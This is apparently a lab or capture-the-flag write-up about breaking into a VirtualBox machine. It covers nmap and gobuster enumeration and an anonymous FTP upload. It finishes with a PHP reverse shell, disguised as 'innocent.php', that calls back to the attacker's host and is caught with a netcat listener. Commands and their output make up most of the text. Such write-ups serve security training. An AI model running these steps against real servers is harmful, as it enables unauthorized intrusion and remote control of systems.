# Task 1: Gain access to a remote server.

After starting the machine, our first task is to identify the ip of the virtual machine in local subnet. I did that by simply doing an nmap scan on the local subnet, since we already know the machine will be hosting a server. There probably are better methods to do the same, but I found this one to be easy and fast in this case.  
`nmap 192.168.1.1/24`  
Within a few seconds, we see only 192.168.1.1 and 192.168.1.10 have open http ports, and since 192.168.1.1 is our router interface, the machine has to be 192.168.1.10.

Now we perform an indepth nmap scan of the ip, using service detection.  
`nmap 192.168.1.10 -sV -p-`  
~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 08:00:27:42:22:F8 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~
After running the following command, we find only open ports to be 21(ftp), 22(ssh) and 80(http). I tried finding the versions of these service on exploit-db but couldn't find a decent exploit and decided to investigate other things first. Using gobuster, we can perform directory enumeration on port 80 to find common directories.  
`gobuster dir -e -u http://192.168.1.10/ -w /usr/share/wordlists/dirb/common.txt`  
~~~
http://192.168.1.10/.hta                 (Status: 403) [Size: 277]
http://192.168.1.10/.htpasswd            (Status: 403) [Size: 277]
http://192.168.1.10/.htaccess            (Status: 403) [Size: 277]
http://192.168.1.10/files                (Status: 301) [Size: 312] [--> http://192.168.1.10/files/]
http://192.168.1.10/index.html           (Status: 200) [Size: 183]                                 
http://192.168.1.10/server-status        (Status: 403) [Size: 277] 
~~~
We found /files/ directory to be accessible by us containing a file 'site.html', which isn't particularly useful though.  
Next we investigate the ftp port and check if it allows anonymous connections:  
`ftp 192.168.1.10`  
~~~
Connected to 192.168.1.10.
220 ProFTPD Server (ProFTPD Default Installation) [192.168.1.10]
Name (192.168.1.10:tinytrebuchet): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp            93 Oct 10 15:02 site.html
~~~
As we can see, the ftp allows anonymous access into the /files/ directory and we can now upload any file via ftp to the server and run it from /files/ on port 80. To get into the server, we will upload a simple php-reverse-shell on port 8888.  
`cp /usr/share/webshells/php/php-reverse-shell.php ~/innocent.php`  
Then we modify the reverse-shell script and change ip to our host os ip (192.168.1.6 for our case found using `ip addr`) and port to 8888. Then finally upload it the server using the ftp connection.  
`put innocent.php`  
~~~
local: innocent.php remote: innocent.php
200 PORT command successful
150 Opening BINARY mode data connection for hash.txt
226 Transfer complete
5493 bytes sent in 0.00 secs (7.9493 kB/s)
~~~
Now, we open a netcat listener on our host os at port 8888 using and then execute the reverse-shell from the http://192.168.10/files/ directory.
We should get a successful connect on our host os:
`nc -lvp 8888`
~~~
listening on [any] 8888 ...
192.168.1.10: inverse host lookup failed: Unknown host
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.10] 37384
Linux ubuntu 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 02:56:34 up 39 min,  0 users,  load average: 0.08, 0.04, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
~~~
